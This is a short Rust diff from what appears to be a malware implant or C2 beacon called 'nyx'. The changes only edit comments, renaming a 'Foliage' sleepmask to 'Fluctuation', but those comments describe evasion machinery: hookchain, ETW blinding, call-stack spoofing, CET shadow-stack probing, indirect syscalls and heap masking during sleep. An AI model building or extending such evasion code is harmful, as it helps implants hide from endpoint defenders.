@@ -173,7 +173,7 @@ fn bootstrap_pdata_gaps() {
         // Operator escape hatch: NYX_SPOOF_OFF=1 forces the swap OFF regardless
         // of the host posture (for targets with non-standard shadow-stack
         // behavior where the CET probe falsely reports off). Mirrors the
-        // NYX_FOLIAGE_OFF pattern.
+        // NYX_FLUCTUATION_OFF pattern.
         let spoof_disabled = match option_env!("NYX_SPOOF_OFF") {
             Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
             None => false,
@@ -333,9 +333,10 @@ pub unsafe extern "system" fn nyx_entry_noevasion() {
 }
 
 /// Minimal initialization: ntdll locate + SSN table + syscalls + CSPRNG.
-/// Skips hookchain/blind/pdata (the evasion init). Foliage sleepmask stays
-/// enabled — it degrades internally to the data-only floor (heap masking +
-/// indirect-syscall sleep) which is safe without the evasion init.
+/// Skips hookchain/blind/pdata (the evasion init). The Fluctuation sleepmask
+/// stays enabled — `kits::sleep` gates it on `beacon::evasion_active()`, so
+/// without the evasion init it falls through to the plain indirect-syscall
+/// floor sleep, which is safe here.
 unsafe fn init_minimal() {
     let ntdll = match crate::resolve::LiveNtdll::locate() {
         Some(n) => n,
